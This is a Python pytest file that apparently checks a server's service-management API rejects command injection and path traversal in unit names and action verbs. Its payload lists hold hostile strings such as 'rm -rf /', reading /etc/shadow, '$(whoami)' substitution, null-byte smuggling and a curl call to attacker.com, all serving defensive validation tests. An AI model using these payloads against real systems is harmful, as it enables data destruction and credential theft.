"""
Ubuntu Server OS — Security Test Battery: Command Injection & Path Traversal Mitigations
Verifies that all command injection payloads are rejected before execution.
"""

import pytest

INJECTION_PAYLOADS = [
    "nginx.service; reboot",
    "nginx.service && rm -rf /",
    "nginx.service | cat /etc/shadow",
    "../../../../bin/bash",
    "`id`.service",
    "$(whoami).service",
    "nginx.service\nreboot",
    "nginx.service\x00reboot",
    "nginx.service; curl http://attacker.com",
    "service_with_spaces .service"
]

import urllib.parse
from server.core.service_manager import ServiceManager
from server.utils.errors import ApiError

def test_command_injection_rejected_in_service_action(authenticated_admin_client):
    client, csrf_token, _ = authenticated_admin_client

    for payload in INJECTION_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload, safe="")
        res = client.post(
            f"/api/v1/services/{encoded_payload}/action",
            headers={"X-CSRF-Token": csrf_token},
            json={"action": "restart"},
            follow_redirects=True
        )
        assert res.status_code in [400, 404], f"Payload was not rejected with client error: {payload} (got {res.status_code})"
        if res.status_code == 400:
            data = res.get_json()
            assert data["code"] in ["ERR_SERVICE_INJECTION_DETECTED", "ERR_SERVICE_INVALID_NAME"]

def test_unit_name_validation_directly():
    mgr = ServiceManager()
    for payload in INJECTION_PAYLOADS:
        with pytest.raises(ApiError) as exc_info:
            mgr.validate_unit_name(payload)
        assert exc_info.value.status == 400
        assert exc_info.value.code in ["ERR_SERVICE_INJECTION_DETECTED", "ERR_SERVICE_INVALID_NAME"]

def test_action_verb_injection_rejected(authenticated_admin_client):
    client, csrf_token, _ = authenticated_admin_client

    malicious_actions = [
        "start; reboot",
        "stop && whoami",
        "restart | sh",
        "../../bin/ls",
        "eval('hack')",
        ""
    ]

    for act in malicious_actions:
        res = client.post(
            "/api/v1/services/nginx.service/action",
            headers={"X-CSRF-Token": csrf_token},
            json={"action": act}
        )
        assert res.status_code == 400
        data = res.get_json()
        assert data["code"] in ["ERR_SERVICE_INVALID_ACTION", "ERR_SERVICE_MISSING_ACTION"]
